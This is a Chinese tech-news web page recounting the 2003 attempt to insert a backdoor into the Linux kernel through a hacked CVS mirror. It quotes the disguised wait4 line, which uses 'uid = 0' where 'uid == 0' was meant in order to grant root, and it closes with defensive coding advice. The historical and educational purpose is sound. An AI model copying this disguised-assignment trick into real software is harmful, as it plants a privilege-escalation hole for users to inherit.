<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>如何在Linux中安插一个后门？ | 极客快訊</title><meta property="og:title" content="如何在Linux中安插一个后门？ - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/483174d7.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/483174d7.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/483174d7.html><meta property="article:published_time" content="2020-10-29T21:12:03+08:00"><meta property="article:modified_time" content="2020-10-29T21:12:03+08:00"><meta name=Keywords content><meta name=description content="如何在Linux中安插一个后门？"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/483174d7.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>如何在Linux中安插一个后门？</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><div><p class=ql-align-justify>Linux内核是开源的代码，能不能向其中安插一个后门呢？这是一件难度很高的操作，但是有人却差点儿成功了，我们来看看这是怎么回事。</p><p class=ql-align-justify>时间回到2003年，当时Linux内核的代码主仓库保存在一个叫做BitKeeper的商业软件中。如果想对Linux内核代码进行修改的话，需要走一个审批流程，以此来确定这次更改能否被接受。每一次更改都有一个简单的说明，其中包含一个指向审批记录的链接。</p><p class=ql-align-justify>但是有些人不喜欢BitKeeper（堂堂的Linux怎么能保存在闭源的商业软件中？！）， 于是一个CVS（估计好多人都没听说过它了吧）被建立了起来，其中保存着从BitKeeper clone来的代码， 这样开发人员可以用开源的CVS来访问Linux代码。</p><p class=ql-align-justify>2003年11月5号，Larry McVoy 注意到了一件怪事，CVS中的一个代码变更没有包含审批记录的链接， 这是怎么回事？</p><p class=ql-align-justify>经过一番调查发现：从来没有人批准过这个代码变更，奇怪的是，这个代码变更并没有出现在BitKeeper主仓库中，原来是有人黑进了CVS的服务器，偷偷插入了一段代码。这段代码到底做了什么事情呢？</p><p class=ql-align-justify>这段代码修改了一个叫做wait4的Linux函数，程序可以使用wait4来等待一些事情的发生，这个代码变更增加了这么两行：</p><pre>if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid = 0)) retval = -EINVAL;</pre><p class=ql-align-justify><br></p><p class=ql-align-justify>（代码可左右滑动，懂得C语言的同学可以思考下，这段代码有什么不寻常的？）</p><p class=ql-align-justify>粗一看这段代码，就会觉得这没啥啊？不就是做一点条件检查吗，不满足条件就返回错误。</p><p class=ql-align-justify>但是仔细看看就会发现事情不对，第一行的最后， 有个"current->uid=0"， 而不是 "current->uid == 0" 。</p><p class=ql-align-justify>正常的写法应该是“==0”, 就是检查当前的用户ID是不是0， 写成“=0”就是把当前用户ID设置为0 ， 而ID为0的用户是"root" ！</p><p class=ql-align-justify>这就意味着，如果这段代码被执行，当前用户就会变成root，可以在系统中为所欲为！</p><p class=ql-align-justify>这其实是个经典的后门， 想象一个，一个黑客在Linux运行了一个程序，这个程序调用了wait4, 然后这个黑客突然间具备了root权限！</p><p class=ql-align-justify>这个后门可是真够聪明的，伪装成了条件检查，试图蒙混过关，如果一直没人发现会怎么样呢？</p><p class=ql-align-justify>首先，后门存在CVS中，不在BitKeeper的主仓库中，从BitKeeper 代码库Build出的Linux肯定没问题， 但是如果有人从CVS代码库中build了Linux， 那就中招了。</p><p class=ql-align-justify>其次，搞破坏的家伙可能有这样的预期：有个被Linus Torvalds所信任的内核开发者，他讨厌BitKeeper，并且在使用CVS， 那当他修改了代码，准备通过邮件的方式向Linus Torvalds发送patch的时候发现，咦，wait4这里也有个code change， 是做条件检查的，也包括进去吧。Linus收到补丁，一看是自己信任的兄弟提交的，没有仔细检查，于是后门代码进入了主代码仓库。</p><p class=ql-align-justify>这当然是猜测的场景，也算是一种社会工程学攻击吧，不过Linux团队非常小心，把这个后门给揪了出来。</p><p class=ql-align-justify>故事到这里就可以结束了，再就这个话题扩展一下，多说两句。</p><p class=ql-align-justify>我记得刚工作的时候，有个同事给我说，在C语言中，当需要和0比较的时候，可以把0放到前面，这么写：</p><p class=ql-align-justify>if( 0 == user_id){ ....... }</p><p class=ql-align-justify>这样即使把 == 写成了 = ， 编译器就会发现错误。我当时觉得挺古怪的，把一个数字放到前面，变量放到后面。后来习惯了，在Java 也经常会这样写 if (null == user){ ...... }</p><p class=ql-align-justify>其实现在的IDE都很智能了，像这种把==写成=的情况，IDE就可以给出警告。即使没有用IDE，如果对源码做静态的代码分析，也会被抓出来的警告的。</p><p class=ql-align-justify>Linux是开源的代码，任何人，只要你愿意，都可以查看所有的代码，这相当于把Linux放到了阳光底下，无数双眼睛都盯着看，这种透明度使得在其中安插一个后门是非常难的。</p><p class=ql-align-justify>参考资料：</p><p class=ql-align-justify>https://lwn.net/Articles/57135/</p><p class=ql-align-justify>https://freedom-to-tinker.com/2013/10/09/the-linux-backdoor-attempt-of-2003/</p></div></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'Linux','一个后门','安插'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>